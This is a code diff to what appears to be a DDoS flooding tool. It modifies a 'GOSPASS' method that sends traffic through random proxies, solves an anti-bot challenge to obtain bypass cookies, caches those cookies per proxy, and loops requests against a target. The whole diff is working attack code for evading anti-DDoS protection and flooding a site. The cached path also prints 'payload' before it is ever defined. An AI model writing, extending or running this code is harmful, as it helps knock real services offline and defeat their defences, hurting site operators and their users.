@@ -436,6 +436,7 @@ class AsyncTcpFlood(FloodBase):
 
     async def GOSPASS(self, on_connect=None) -> bool:
         packets_sent = 0
+        # user_agent = random.choice(USERAGENTS)
         user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36"
         proxy_url = self._proxies.pick_random()
         connector = ProxyConnector.from_url(proxy_url, ssl=False)
@@ -447,21 +448,28 @@ class AsyncTcpFlood(FloodBase):
             connector=connector,
             timeout=cl_timeout,
         ) as s:
-            async with s.get(
-                solver.path,
-                # XXX: more headers
-                headers={
-                    "User-Agent": user_agent,
-                    "Accept": "application/json",
-                    "Accept-Encoding": "gzip, deflate"
-                },
-            ) as response:
-                payload = dict(await response.json())
-                if not "cn" in payload:
-                    raise RuntimeError("Invalid challenge payload")
-            if on_connect and not on_connect.done():
-                on_connect.set_result(True)
-            (latest_ts, cookies) = solver.solve(user_agent, payload)
+            # we always replace proxy host with resolved addr
+            cached_cookies = solver.lookup(solver.DEFAULT_A, URL(proxy_url).host)
+            if cached_cookies is None:
+                # there's certainly a race condition here between us looking up
+                # in the dictionary and tasks are already running to fetch challenge
+                # we are okay though as the challenge itself is stateless with
+                # respect to only a few parameters we control for
+                async with s.get(
+                    solver.path,
+                    # XXX: more headers
+                    headers={
+                        "User-Agent": user_agent,
+                        "Accept": "application/json",
+                        "Accept-Encoding": "gzip, deflate"
+                    },
+                ) as response:
+                    payload = dict(await response.json())
+                    if not "cn" in payload:
+                        raise RuntimeError("Invalid challenge payload")
+                (latest_ts, cookies) = solver.solve(user_agent, payload)
+            else:
+                (latest_ts, user_agent, cookies) = cached_cookies
             print("solved", payload, cookies)
             s.cookie_jar.update_cookies(cookies)
             for ind in range(100):
@@ -473,6 +481,8 @@ class AsyncTcpFlood(FloodBase):
                         "User-Agent": user_agent,
                     },
                 ) as response:
+                    if on_connect and not on_connect.done():
+                        on_connect.set_result(True)
                     print(f"got response ind={ind} proxy={proxy_url} {response.request_info}")
                     packets_sent += 1
                     async with async_timeout.timeout(req_timeout):
@@ -480,6 +490,8 @@ class AsyncTcpFlood(FloodBase):
                         # XXX: this is actually quite slow to detect
                         bypass = solver.verify(body)
                         print(f"got body ind={ind} bypass={bypass} size={len(body)}")
+                        if not bypass: break
+                await asyncio.sleep(1.0)
         return packets_sent > 0
 
     async def CFB(self, on_connect=None) -> bool:
